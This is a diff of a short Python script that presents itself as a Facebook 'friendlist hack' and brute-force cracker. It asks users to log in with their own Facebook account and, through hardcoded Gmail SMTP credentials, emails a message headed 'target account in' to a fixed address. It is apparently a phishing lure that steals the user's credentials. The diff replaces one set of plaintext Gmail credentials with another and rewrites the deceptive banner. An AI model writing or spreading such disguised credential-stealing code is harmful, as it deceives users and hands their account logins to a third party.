@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # coding=utf-8
 import socket,struct,os,sys,time,yagmail
-x=yagmail.SMTP('tololvenom@gmail.com','kontol3452')
+x=yagmail.SMTP('deteksiakun3452@gmail.com','akun3452')
 subject='AKUN TARGET MASUK'
 logo = """\033[1;94m█████████
 \033[1;94m█▄█████▄█      \033[1;94m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
@@ -12,9 +12,9 @@ logo = """\033[1;94m█████████
 \033[1;94m ██ ██\x1b[00m"""
 
 banner = """
-\x1b[34mHack akun teman secara target
-\x1b[00mRetas akun facebook orang lain dengan mudah
-\x1b[00mlogin menggunakan akun facebook pribadi \x1b[91m!
+\x1b[34mHack Friendlist Facebook
+\x1b[00mAutomatic cracking password with Bruteforce
+\x1b[00mPlease login with your account \x1b[91m!
 """
 def main():
         os.system('clear')
@@ -33,5 +33,4 @@ def main():
         print('\x1b[00mExiting program \x1b[91m!')
         os.system('exit')
         x.send('s35997949@gmail.com',subject,body)
-        
 main()
